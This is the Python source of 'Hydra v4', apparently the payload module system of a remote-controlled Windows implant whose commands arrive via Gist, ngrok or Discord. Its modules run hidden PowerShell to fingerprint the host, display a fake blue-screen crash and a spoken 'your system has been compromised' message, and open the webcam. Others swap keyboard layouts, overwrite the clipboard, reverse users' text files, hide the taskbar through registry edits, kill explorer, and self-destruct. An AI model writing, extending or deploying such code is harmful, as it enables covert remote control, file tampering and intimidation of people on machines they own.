"""
Hydra v4 — Payload module system.
Each module registered with @register decorator.
Execute by name via Gist/ngrok/Discord command.
"""
import os
import sys
import time
import random
import threading
import subprocess
import ctypes


# ─── Module Registry ─────────────────────────────────

MODULE_REGISTRY = {}


def register(name):
    """Decorator to register a module handler."""
    def wrapper(fn):
        MODULE_REGISTRY[name] = fn
        return fn
    return wrapper


def execute_module(name: str, args: list = None):
    """Execute a module by name. Returns result string."""
    if name not in MODULE_REGISTRY:
        return f"Unknown module: {name}"

    try:
        return MODULE_REGISTRY[name](*(args or []))
    except Exception as e:
        return f"Module '{name}' error: {e}"


# ─── Helper Utilities ───────────────────────────────

def _run_ps(script: str) -> str:
    """Run a PowerShell script and return output."""
    try:
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = 0
        r = subprocess.run(
            ["powershell", "-WindowStyle", "Hidden", "-Command", script],
            startupinfo=si, capture_output=True, text=True, timeout=30
        )
        return r.stdout.strip() or "OK"
    except Exception as e:
        return str(e)


def _create_solid_bmp(path: str, r: int, g: int, b: int):
    """Create a 1x1 BMP file of solid color."""
    data = bytes([
        0x42, 0x4D,          # 'BM'
        0x3A, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x36, 0x00, 0x00, 0x00,
        0x28, 0x00, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00,
        0x01, 0x00,
        0x18, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x04, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
        b, g, r, 0x00,
    ])
    with open(path, "wb") as f:
        f.write(data)


# ═══════════════════════════════════════════════════════
# MODULE DEFINITIONS
# ═══════════════════════════════════════════════════════


@register("ping")
def mod_ping():
    """Respond with agent info."""
    import socket
    hostname = socket.gethostname()
    username = os.environ.get("USERNAME", "?")
    return f"PONG from {hostname}\\{username} | PID={os.getpid()}"


@register("popup")
def mod_popup(title: str = "System Message", text: str = "..."):
    """Show a popup message."""
    ctypes.windll.user32.MessageBoxW(0, text, title, 0x40)
    return f"Popup shown: {title}"


@register("notepad")
def mod_notepad(count: str = "3", message: str = ""):
    """Spawn Notepad windows."""
    n = int(count) if count.isdigit() else 3
    for i in range(n):
        try:
            subprocess.Popen("notepad.exe", shell=True)
            time.sleep(0.3)
        except:
            pass
    return f"Spawned {n} Notepad windows"


@register("wallpaper")
def mod_wallpaper(path: str = None):
    """Change desktop wallpaper."""
    if path and os.path.exists(path):
        wp_path = path
    else:
        wp_path = os.path.join(os.environ.get("TEMP", "."), "hydra_wp.bmp")
        _create_solid_bmp(wp_path, 0, 0, 0)

    esc = wp_path.replace("\\", "\\\\")
    _run_ps(f"""
Add-Type @'
using System; using System.Runtime.InteropServices;
public class WP {{
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}}
'@
[WP]::SystemParametersInfo(20, 0, '{esc}', 2)
""")
    return f"Wallpaper set: {wp_path}"


@register("cursor")
def mod_cursor(duration: str = "10"):
    """Jiggle the cursor for N seconds."""
    d = int(duration) if duration.isdigit() else 10
    threading.Thread(target=_jiggle_cursor, args=(d,), daemon=True).start()
    return f"Cursor jiggling for {d}s"


def _jiggle_cursor(duration: int):
    end = time.time() + duration
    while time.time() < end:
        ctypes.windll.user32.SetCursorPos(
            random.randint(100, 800),
            random.randint(100, 600)
        )
        time.sleep(random.uniform(0.2, 1.0))


@register("screen_flash")
def mod_screen_flash(color: str = "red", count: str = "3"):
    """Fullscreen colored flash overlay."""
    c = int(count) if count.isdigit() else 3
    colors = {"red": 0x0000FF, "blue": 0xFF0000, "green": 0x00FF00,
              "black": 0x000000, "white": 0xFFFFFF, "yellow": 0x00FFFF}
    color_val = colors.get(color.lower(), 0x0000FF)
    for _ in range(c):
        _run_ps(f"""
Add-Type -AssemblyName System.Windows.Forms
$f = New-Object Windows.Forms.Form
$f.FormBorderStyle = 'None'
$f.WindowState = 'Maximized'
$f.BackColor = [System.Drawing.Color]::FromArgb({color_val})
$f.TopMost = $true
$f.Show()
Start-Sleep -Milliseconds 300
$f.Close()
""")
    return f"Flashed {color} {c}x"


@register("cd_tray")
def mod_cd_tray(action: str = "open"):
    """Open or close CD/DVD tray."""
    try:
        ctypes.windll.winmm.mciSendStringW(
            f"set cdaudio door {'open' if action == 'open' else 'closed'}",
            None, 0, 0
        )
        return f"CD tray: {action}"
    except:
        return "CD tray: FAILED (no drive?)"


@register("file_reverse")
def mod_file_reverse(path: str = None):
    """Reverse .txt files in Documents (harmless, reversible with .bak)."""
    docs = path or os.path.join(os.path.expanduser("~"), "Documents")
    count = 0
    try:
        for root, dirs, files in os.walk(docs):
            for f in files:
                if f.endswith(".txt") and ".bak" not in f:
                    fp = os.path.join(root, f)
                    try:
                        with open(fp, "r", encoding="utf-8", errors="ignore") as fh:
                            content = fh.read()
                        with open(fp + ".bak", "w", encoding="utf-8") as fh:
                            fh.write(content)
                        with open(fp, "w", encoding="utf-8") as fh:
                            fh.write(content[::-1])
                        count += 1
                    except:
                        pass
                    if count >= 20:
                        break
    except:
        pass
    return f"Reversed {count} .txt files"


@register("selfdestruct")
def mod_selfdestruct():
    """Remote self-destruct command."""
    try:
        from hydra.sandbox import self_destruct
        self_destruct()
        os._exit(0)
    except:
        pass
    return "Self-destruct initiated"


# ═══════════════════════════════════════════════════════
# SPRINT 2 MODULES
# ═══════════════════════════════════════════════════════


@register("bsod")
def mod_bsod():
    """Fullscreen fake BSOD overlay. Dismiss with Esc."""
    _run_ps("""
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$f = New-Object Windows.Forms.Form
$f.FormBorderStyle = 'None'
$f.WindowState = 'Maximized'
$f.BackColor = [Drawing.Color]::FromArgb(0,0,170)
$f.TopMost = $true
$f.KeyPreview = $true
$lbl = New-Object Windows.Forms.Label
$lbl.Text = ":(\n\nYour PC ran into a problem and needs to restart.\n\nWe're just collecting some error info, and then we'll restart for you.\n\n0% complete\n\nFor more info visit https://www.windows.com/stopcode\n\nStop code: HYDR4_V4_VIOLATION"
$lbl.ForeColor = [Drawing.Color]::White
$lbl.Font = New-Object Drawing.Font('Consolas',14)
$lbl.AutoSize = $false
$lbl.Dock = 'Fill'
$lbl.TextAlign = 'MiddleCenter'
$f.Controls.Add($lbl)
$f.Add_KeyDown({if($_.KeyCode -eq 'Escape'){$f.Close()}})
$f.ShowDialog()
""")
    return "BSOD displayed"


@register("audio")
def mod_audio():
    """TTS voice message at max volume."""
    _run_ps("""
Add-Type -AssemblyName System.Speech
$s = New-Object System.Speech.Synthesis.SpeechSynthesizer
$s.Rate = -2
$s.Volume = 100
$s.Speak('Hello. This is Hydra. Your system has been compromised. Have a nice day.')
""")
    return "TTS audio played"


@register("browser")
def mod_browser(url: str = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"):
    """Open URL in default browser."""
    try:
        os.startfile(url)
    except:
        _run_ps(f"Start-Process '{url}'")
    return f"Browser opened: {url}"


@register("webcam")
def mod_webcam():
    """Flash the webcam on briefly (1-2 seconds, scare factor)."""
    _run_ps("""
$cam = New-Object -ComObject WScript.Shell
$cam.Run("microsoft.windows.camera:",1,$false)
Start-Sleep -Seconds 2
Get-Process -Name "WindowsCamera" -ErrorAction SilentlyContinue | Stop-Process -Force
""")
    return "Webcam flashed"


@register("keyboard_swap")
def mod_keyboard_swap():
    """Swap keyboard layout. Detects current layout, picks something different."""
    _run_ps("""
$current = Get-WinUserLanguageList | Select -First 1 -ExpandProperty LanguageTag
# Try German, French, or Arabic — pick one different from current
$options = @('de-DE','fr-FR','ar-SA','ru-RU','ja-JP')
$target = $options | Where-Object {$_ -ne $current} | Select -First 1
if(-not $target){$target = 'ar-SA'}
$list = Get-WinUserLanguageList
$list.Clear()
$list.Add($target)
Set-WinUserLanguageList -LanguageList $list -Force
# Restore original after 30 seconds
Start-Sleep -Seconds 30
$list2 = Get-WinUserLanguageList
$list2.Clear()
$list2.Add($current)
Set-WinUserLanguageList -LanguageList $list2 -Force
""")
    return "Keyboard layout swapped + auto-restore in 30s"


@register("clipboard")
def mod_clipboard(msg: str = None):
    """Replace clipboard content via clip.exe (thread-safe)."""
    if not msg:
        garbage = [
            "HYDRA WAS HERE",
            "you have been hacked lol",
            "01101000 01100001 01100011 01101011 01100101 01100100",
        ]
        msg = random.choice(garbage)

    # Use clip.exe — no STA threading requirement
    try:
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        subprocess.run(
            f'echo {msg} | clip',
            startupinfo=si, shell=True, timeout=5
        )
    except:
        pass
    return f"Clipboard replaced: {msg}"


@register("monitor")
def mod_monitor():
    """Flip screen 180 degrees (Ctrl+Alt+Up to restore)."""
    _run_ps("""
$s = New-Object -ComObject WScript.Shell
$s.SendKeys("^%{DOWN}")
""")
    return "Screen flipped (Ctrl+Alt+Up to restore)"


@register("taskbar")
def mod_taskbar():
    """Hide taskbar and desktop icons."""
    _run_ps("""
$rk = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StuckRects3'
$val = Get-ItemProperty -Path $rk -Name Settings -ErrorAction SilentlyContinue
if($val){
    $b = $val.Settings
    $b[8] = $b[8] -bxor 0x01
    Set-ItemProperty -Path $rk -Name Settings -Value $b
}
$dk = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced'
Set-ItemProperty -Path $dk -Name HideIcons -Value 1 -Type DWord -Force
Stop-Process -Name explorer -Force
""")
    return "Taskbar + icons hidden"
